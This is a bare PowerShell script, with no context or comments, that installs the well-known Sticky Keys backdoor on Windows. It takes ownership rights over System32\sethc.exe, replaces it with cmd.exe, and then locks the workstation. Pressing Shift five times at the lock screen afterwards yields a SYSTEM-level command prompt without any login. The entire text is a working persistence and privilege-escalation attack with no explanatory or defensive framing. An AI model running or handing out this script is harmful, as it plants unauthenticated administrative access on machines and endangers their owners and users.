$a = get-acl "C:\Windows\System32\sethc.exe"
$me = whoami
$b = New-Object System.Security.AccessControl.FileSystemAccessRule("$me","FullControl","Allow")
$a.SetAccessRule($b)
$a | Set-Acl "C:\Windows\System32\sethc.exe"

Copy-Item "C:\Windows\System32\cmd.exe" -Destination "$env:TEMP\sethc.exe"
Remove-Item "C:\Windows\System32\sethc.exe" -Force
Move-Item "$env:TEMP\sethc.exe" -Destination "C:\Windows\System32\sethc.exe"

rundll32.exe user32.dll,LockWorkStation